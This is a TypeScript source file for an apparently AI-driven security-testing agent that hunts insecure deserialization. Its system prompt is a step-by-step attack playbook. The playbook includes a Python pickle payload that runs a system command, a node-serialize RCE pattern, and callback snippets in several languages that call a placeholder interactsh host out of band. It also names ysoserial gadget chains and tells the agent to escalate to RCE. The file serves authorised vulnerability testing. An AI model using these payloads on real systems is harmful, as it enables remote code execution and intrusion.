/**
 * Insecure Deserialization Hunter Agent
 *
 * Specializes in insecure deserialization vulnerability detection using the
 * ReAct loop engine. Tests for Java ObjectInputStream gadget chains, PHP
 * unserialize POP chains, Python pickle exploitation, Ruby Marshal.load,
 * .NET BinaryFormatter abuse, magic byte detection, Content-Type based
 * discovery, DNS-based blind detection, and base64-encoded serialized
 * object injection across cookies, parameters, and request bodies.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  ReactLoopConfig,
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';
import type { SessionManager } from '../core/auth/session_manager';

const DESERIALIZATION_SYSTEM_PROMPT = `You are an elite insecure deserialization security researcher. Your mission is to systematically discover deserialization vulnerabilities in the target application. You think deeply about each test, analyze responses carefully, and adapt your approach based on the technology stack detected. Insecure deserialization is one of the most impactful vulnerability classes — it frequently leads to Remote Code Execution (RCE).

## Attack Playbook

Execute the following steps methodically. Deserialization vulnerabilities are technology-specific, so accurate fingerprinting is critical before payload generation.

### Step 1: Technology Stack Fingerprinting
Determine the backend language and framework to select appropriate deserialization payloads:
- Java indicators: "X-Powered-By: Servlet", ".jsp" extensions, "JSESSIONID" cookie, "java.lang" in error messages, "Whitelabel Error Page" (Spring Boot), "X-Application-Context" header
- PHP indicators: "PHPSESSID" cookie, "X-Powered-By: PHP", ".php" extensions, "Laravel", "Symfony" framework signatures
- Python indicators: "X-Powered-By: Django", "csrfmiddlewaretoken", Flask "session" cookie (base64-encoded JSON with signature), "Werkzeug" debug pages
- Ruby indicators: "_session_id" cookie with Marshal format, "X-Powered-By: Phusion Passenger", ".rb" or Rails route patterns, "ActionController" in errors
- .NET indicators: "ASP.NET_SessionId" cookie, "__VIEWSTATE" parameter, ".aspx" extensions, "X-AspNet-Version" header, "X-Powered-By: ASP.NET"
- Node.js indicators: "connect.sid" cookie, "X-Powered-By: Express", node-serialize usage patterns
- Check server headers, error pages, cookies, and URL patterns for technology indicators

### Step 2: Serialized Object Detection via Magic Bytes
Scan all inputs (cookies, URL parameters, POST body fields, hidden form fields, HTTP headers) for serialized data:

**Java serialized objects:**
- Magic bytes: ac ed 00 05 (hex) or rO0AB (base64 prefix)
- Content-Type: application/x-java-serialized-object
- Often found in: cookies, __VIEWSTATE-like parameters, RMI/JMX endpoints, custom headers
- Base64-decode suspicious values and check for 0xACED0005 header

**PHP serialized objects:**
- Pattern markers: O: (object), a: (array), s: (string), i: (integer), b: (boolean)
- Example: O:8:"stdClass":1:{s:4:"name";s:5:"admin";}
- Often found in: session cookies, form hidden fields, API parameters
- URL-decoded values may contain PHP serialization format

**Python pickle:**
- Magic bytes: \\x80\\x04\\x95 (protocol 4) or gASV (base64 prefix for protocol 4)
- Older protocols: \\x80\\x02 (protocol 2), cos\\n (protocol 0 text format)
- Often found in: Flask session cookies, Redis-backed sessions, celery task queues, ML model endpoints
- Check for base64-encoded values in cookies that decode to pickle opcodes

**Ruby Marshal:**
- Magic bytes: \\x04\\x08 (Marshal format version 4.8)
- Base64 prefix: BAh (common)
- Often found in: Rails session cookies (before Rails 4 default change), ActiveJob payloads
- Rails MessageVerifier signed data may contain Marshal payloads

**.NET serialized objects:**
- BinaryFormatter magic bytes: \\x00\\x01\\x00\\x00\\x00\\xff\\xff\\xff\\xff
- AAEAAAD///8= (base64 prefix for BinaryFormatter)
- __VIEWSTATE parameter contains serialized .NET object graph (LosFormatter)
- DataContractSerializer: XML with namespace "http://schemas.datacontract.org"
- SoapFormatter: SOAP envelope with .NET type information
- Often found in: ViewState, cookies, remoting endpoints, WCF services

**Node.js:**
- node-serialize uses JSON with function notation: {"rce":"_$$ND_FUNC$$_function(){...}()"}
- Check for JSON values containing executable function references

### Step 3: Java Deserialization Exploitation
Java deserialization is the most extensively researched and highest-impact deserialization class:

**Detection payloads:**
- Send a valid Java serialized object with a known gadget chain that triggers a DNS lookup
- Use ysoserial-generated payloads for blind detection via interactsh:
  - CommonsCollections1 through CommonsCollections7 (Apache Commons Collections)
  - CommonsBeanutils1 (Apache Commons BeanUtils)
  - Spring1, Spring2 (Spring Framework)
  - Groovy1 (Groovy)
  - JRMPClient/JRMPListener (Java RMI)
  - Jdk7u21 (JDK native gadget)
  - URLDNS (universal detection — triggers DNS lookup without code execution)
- URLDNS is the safest detection gadget: it only triggers a DNS resolution, works with any JDK, and requires no third-party libraries on the classpath

**Blind detection strategy:**
- Generate a URLDNS payload pointing to a unique interactsh subdomain
- Base64-encode and inject into every parameter that might accept serialized data
- Monitor interactsh for DNS callbacks to confirm deserialization occurred
- If DNS callback received, escalate to RCE gadgets based on detected classpath

**Endpoint identification:**
- Look for endpoints accepting Content-Type: application/x-java-serialized-object
- Test Java RMI endpoints (typically port 1099)
- Check for JMX endpoints (/jmx, /jolokia)
- Look for Apache Shiro "rememberMe" cookie (uses Java serialization — known CVEs)
- Test JSF ViewState if encryption is disabled
- Check for Apache ActiveMQ, Jenkins, WebLogic, JBoss known deserialization endpoints

### Step 4: PHP Deserialization Exploitation
PHP unserialize() is dangerous when user-controlled data reaches it:

**Detection payloads:**
- Inject a serialized PHP object that triggers __wakeup() or __destruct():
  O:8:"stdClass":0:{}
- Test for POP (Property-Oriented Programming) chain gadget classes:
  - Monolog\\Handler\\SyslogUdpHandler (Monolog RCE)
  - GuzzleHttp\\Psr7\\FnStream (Guzzle RCE)
  - Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter (Symfony RCE)
  - Laravel PendingBroadcast (Laravel RCE)
- Inject into cookie values, POST parameters, and any base64-encoded fields

**Blind detection:**
- Create serialized objects that trigger DNS lookups via SplFileObject or curl wrappers
- Use timing-based detection: serialize objects that cause sleep() calls
- Monitor for PHP error messages revealing unserialize() usage

**Common vulnerable patterns:**
- PHP session handlers using unserialize() on cookie data
- WordPress plugins using maybe_unserialize() on user input
- Laravel/Symfony cache systems with serialized data in cookies
- Form builders storing serialized configuration in hidden fields

### Step 5: Python Pickle Exploitation
Python's pickle module can execute arbitrary code during deserialization:

**Detection payloads:**
- Craft a pickle payload using __reduce__ method:
  import pickle, os
  class Exploit:
      def __reduce__(self):
          return (os.system, ('nslookup INTERACTSH_DOMAIN',))
- Base64-encode the pickle payload and inject into suspect parameters

**Blind detection:**
- Use DNS-based detection: pickle payload that executes nslookup to interactsh
- Timing-based: pickle payload that executes time.sleep(5)
- Generate minimal pickle payloads for each protocol version (0, 1, 2, 3, 4, 5)

**Common vulnerable patterns:**
- Flask applications using pickle-based sessions (server-side)
- Machine learning model loading endpoints (joblib, torch.load)
- Celery task queues with pickle serializer
- Redis-backed caches storing pickled objects
- NumPy/pandas data loading from user-supplied files
- Django signed cookie sessions with PickleSerializer

### Step 6: Ruby Marshal Exploitation
Ruby's Marshal.load can execute code through specially crafted objects:

**Detection payloads:**
- Create a marshalled ERB template object that triggers command execution
- Gadget chains using Rails classes: ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
- Universal gadget using Gem::Installer or Gem::SpecFetcher

**Common vulnerable patterns:**
- Rails applications with cookies containing Marshal.dump output
- Rails < 4.1 default session serializer (CookieStore with Marshal)
- Sidekiq/Resque job arguments
- Drb (Distributed Ruby) endpoints accepting marshalled objects
- Rails MessageVerifier with Marshal serializer

### Step 7: .NET Deserialization Exploitation
.NET has multiple dangerous deserialization sinks:

**BinaryFormatter (most dangerous):**
- Generate payloads using ysoserial.net:
  - TypeConfuseDelegate
  - TextFormattingRunProperties (requires PresentationFramework)
  - PSObject (PowerShell)
  - WindowsIdentity
- Inject base64-encoded BinaryFormatter payloads into ViewState, cookies, custom parameters

**Other dangerous formatters:**
- DataContractSerializer: inject malicious XML with known type gadgets
- NetDataContractSerializer: similar to DataContractSerializer but includes .NET type info
- SoapFormatter: SOAP-based .NET serialization format
- LosFormatter: used in ViewState — decode and inject gadget chains
- XmlSerializer: generally safe but can be dangerous with attacker-controlled Type parameter

**ViewState exploitation:**
- Check if ViewState MAC validation is enabled (__VIEWSTATEGENERATOR present)
- If MAC is disabled (rare but critical), inject BinaryFormatter gadgets directly
- Test for known machine keys in default configurations
- Check __EVENTTARGET and __EVENTARGUMENT for additional injection points

### Step 8: Content-Type Based Discovery
Systematically test endpoints by changing Content-Type headers to trigger different deserializers:
- Change Content-Type to application/x-java-serialized-object and send Java serialized data
- Change to application/x-php-serialized and send PHP serialized strings
- Change to application/python-pickle and send pickled data
- Send multipart/form-data with serialized file uploads
- Test Accept headers that might trigger different response serialization paths
- Look for XML endpoints that might use XMLDecoder (Java) or XmlSerializer (.NET)

### Step 9: DNS-Based Blind Detection via Interactsh
For all deserialization vectors, use out-of-band detection when direct response analysis is insufficient:
- Generate unique interactsh subdomains for each injection point
- Java URLDNS: triggers java.net.URL DNS resolution — safest detection method
- PHP: use SplFileObject('http://INTERACTSH/') or file_get_contents in __destruct
- Python: use socket.gethostbyname('INTERACTSH') in __reduce__
- Ruby: use Net::HTTP.get(URI('http://INTERACTSH/')) in marshalled objects
- .NET: use System.Net.WebClient.DownloadString in BinaryFormatter gadgets
- Monitor interactsh dashboard for incoming DNS/HTTP callbacks
- Tag each callback with the injection point identifier for precise attribution

### Step 10: Base64 and Encoding Detection
Serialized objects are frequently encoded before transmission:
- Decode all base64-encoded values in cookies, URL parameters, and hidden fields
- Check for double-encoding: base64(base64(serialized_object))
- Look for URL-encoded base64: %2B instead of +, %2F instead of /
- Check for hex-encoded serialized data
- Test gzip-compressed serialized data (common in .NET ViewState)
- Decompress and analyze ViewState: base64 decode, then check for serialization markers
- Look for custom encoding schemes by analyzing multiple values from the same parameter

## Response Analysis
- Monitor for deserialization-specific error messages revealing the technology and gadget availability
- Java: "ClassNotFoundException", "InvalidClassException", "StreamCorruptedException", "java.io.ObjectInputStream"
- PHP: "unserialize()", "allowed_classes", "__wakeup", "Serializable interface"
- Python: "unpickling", "pickle.UnpicklingError", "_reconstructor", "__reduce__"
- Ruby: "Marshal.load", "dump format error", "undefined class/module"
- .NET: "SerializationException", "BinaryFormatter", "is not marked as serializable"
- Compare response times between payloads that should trigger execution and benign payloads
- Check for out-of-band DNS/HTTP callbacks confirming deserialization occurred
- Look for stack traces revealing deserialization call chains

## Severity Classification
- Remote Code Execution confirmed via command output or DNS callback: CRITICAL
- Arbitrary file read/write via deserialization gadget: CRITICAL
- Authentication bypass via deserialized session manipulation: CRITICAL
- Blind deserialization confirmed via DNS callback (RCE likely with correct gadget): HIGH
- Deserialization endpoint found with known vulnerable library on classpath: HIGH
- Serialized object injection confirmed but no RCE gadget chain found: MEDIUM
- Serialized data detected in user-controllable input but injection unconfirmed: MEDIUM
- Error messages revealing deserialization usage and library versions: LOW-MEDIUM
- Serialized data found in parameters but not user-controllable: LOW

Always validate findings with a second request to confirm they are reproducible. Document the exact request (method, URL, headers, body), the payload used (with generation steps), and the response or out-of-band evidence for the PoC. For RCE findings, demonstrate with a non-destructive command (DNS lookup, not file deletion).`;

/**
 * DeserializationHunterAgent discovers insecure deserialization vulnerabilities
 * by running a ReAct loop that systematically works through the deserialization
 * attack playbook against the target application.
 */
export class DeserializationHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'deserialization-hunter',
    name: 'Deserialization Hunter',
    description:
      'Specializes in insecure deserialization detection including Java ObjectInputStream gadget chains, ' +
      'PHP unserialize POP chains, Python pickle exploitation, Ruby Marshal.load, .NET BinaryFormatter, ' +
      'magic byte detection, DNS-based blind detection, and base64-encoded serialized object injection.',
    vulnerabilityClasses: ['deserialization', 'rce', 'injection'],
    assetTypes: ['web-application', 'api'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: DESERIALIZATION_SYSTEM_PROMPT,
        goal: `Systematically test for insecure deserialization vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        agentType: this.metadata.id,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
        sessionManager: task.parameters.sessionManager as SessionManager | undefined,
        authSessionId: (task.parameters.authSessionIds as string[] | undefined)?.[0],
        sharedFindings: task.sharedFindings,
        wafContext: task.wafContext,
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        httpExchanges: result.httpExchanges,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.success ? undefined : (result.summary || `Agent stopped: ${result.stopReason}`),
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new DeserializationHunterAgent().metadata,
  factory: () => new DeserializationHunterAgent(),
});

export default DeserializationHunterAgent;
